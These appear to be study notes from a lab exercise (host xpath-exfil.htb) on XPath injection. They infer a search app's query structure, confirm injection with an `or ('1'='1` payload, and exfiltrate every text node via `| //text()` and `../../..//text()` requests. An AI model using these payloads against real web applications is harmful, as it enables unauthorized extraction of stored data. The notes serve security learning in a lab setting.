# XPath - Data Exfiltration

# **Simple Data Exfiltration**

- Example
    - Web application that allows to query data
        
        ![Untitled](XPath%20-%20Data%20Exfiltration/Untitled.png)
        
        ![Untitled](XPath%20-%20Data%20Exfiltration/Untitled%201.png)
        
    - This reveals two node names: `fullstreetname` and `streetname`
    - From the web application's behavior, we can deduce information about the XPath query that is performed
    - Since we do not know the names of the element nodes in the XML document, we will denote the path by single character placeholder names `a`, `b`, `c`, and `d`. The query most likely looks like this `/a/b/c/[contains(d/text(), 'BAR')]/fullstreetname`
        
        <aside>
        ℹ️ **Note: For now, w**e do not know whether the depth of the XML schema is three like depicted above (`/a/b/c`).
        
        </aside>
        
    - The document has to look something like this
        
        ```xml
        <a>
        	<b>
        		<c>
        			<d>???</d>
        			<streetname>BARCELONA</streetname>
        			<fullstreetname>BARCELONA AVE</fullstreetname>
        		</c>
        	</b>
        </a>
        ```
        

# **Confirming XPath Injection**

- Confirm by sending a payload like this `SOMETHINGINVALID') or ('1'='1` in the `q` parameter
    
    ```xml
    /a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]
    ```
    
    ![Untitled](XPath%20-%20Data%20Exfiltration/Untitled%202.png)
    

### **Exfiltrating Data**

- Append a new query that returns all text nodes

```python
GET /index.php?q=SOMETHINGINVALID&f=fullstreetname+|+//text() HTTP/1.1
Host: xpath-exfil.htb
```

```python
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | //text()
```

![Untitled](XPath%20-%20Data%20Exfiltration/Untitled%203.png)

- Same result using the `q` parameter via `SOMETHINGINVALID') or ('1'='1` and setting the `f` parameter to `../../..//text()`

```python
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]/../../..//text()
```